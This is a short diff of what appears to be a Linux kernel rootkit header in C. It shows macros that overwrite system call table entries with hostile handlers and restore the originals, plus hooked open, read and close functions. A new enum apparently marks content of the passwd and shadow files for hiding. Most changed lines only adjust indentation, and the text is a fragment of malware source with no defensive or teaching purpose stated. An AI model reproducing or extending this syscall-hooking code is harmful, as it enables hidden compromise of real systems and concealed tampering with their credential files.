@@ -17,14 +17,14 @@
     do{ \
         TOGGLE_PROTECTION(WRITABLE); \
         good_call = (void *)sctable[__NR_index]; \
-    	sctable[__NR_index] = (void *)&evil_call; \
+		sctable[__NR_index] = (void *)&evil_call; \
         TOGGLE_PROTECTION(READABLE); \
     }while(0);
 
 #define UNHOOK_SYSCALL(sctable, good_call, __NR_index) \
     do{ \
         TOGGLE_PROTECTION(WRITABLE); \
-        sctable[__NR_index] = (void *)good_call; \
+		sctable[__NR_index] = (void *)good_call; \
         TOGGLE_PROTECTION(READABLE); \
     }while(0);
 
@@ -37,4 +37,6 @@ static asmlinkage int (*good_close)(int);
 static asmlinkage int king_crimson (char *, int, mode_t);
 static asmlinkage ssize_t erase_time (int, void *, size_t);
 static asmlinkage int this_is_requiem (int);
-static int erased = 1;  // 0 if read syscall is hijacked
+
+enum file_content_hide {NONE, PASS_E, SHAD_E} file_content_hide;
+static enum file_content_hide erase = NONE;
